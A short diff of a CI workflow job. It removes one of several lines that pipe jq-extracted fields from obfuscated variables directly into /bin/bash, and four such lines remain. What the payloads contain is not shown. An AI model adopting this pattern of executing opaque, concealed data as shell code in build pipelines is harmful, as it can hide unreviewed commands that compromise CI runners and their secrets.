@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$sf5" | jq -r .k2 | /bin/bash
           printf '%s' "$nfu793" | jq -r .anhoc29654 | /bin/bash
           echo $xccsf7657 | jq -r .iwsx3 | /bin/bash
-          printf '%s' "$vhse99129" | jq -r .c92 | /bin/bash
           echo $cwe4259 | jq -r .c89 | /bin/bash
 
       - name: Archive output
